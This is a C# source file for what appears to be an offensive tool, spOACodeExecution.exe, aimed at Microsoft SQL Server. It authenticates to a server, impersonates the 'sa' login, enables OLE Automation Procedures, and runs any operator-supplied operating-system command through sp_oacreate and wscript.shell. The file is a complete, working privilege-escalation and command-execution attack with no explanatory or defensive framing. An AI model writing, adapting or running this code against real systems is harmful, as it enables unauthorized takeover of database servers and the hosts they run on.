using System;
using System.Data.SqlClient;
namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                String sqlServer = args[0];
                String database = args[1];
                String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
                SqlConnection con = new SqlConnection(conString);

                try
                {
                    con.Open();
                    Console.WriteLine("Auth success!");
                }
                catch
                {
                    Console.WriteLine("Auth failed");
                    Environment.Exit(0);
                }

                String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
                String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"" + args[2] + "\"';";

                SqlCommand command = new SqlCommand(impersonateUser, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(enable_ole, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(execCmd, con);
                reader = command.ExecuteReader();
                reader.Close();

                con.Close();
            }
            catch
            {
                Console.WriteLine("Invalid Usage!\n\n\tspOACodeExecution.exe <sql server> <database name> <command>");
            }
        }
    }
}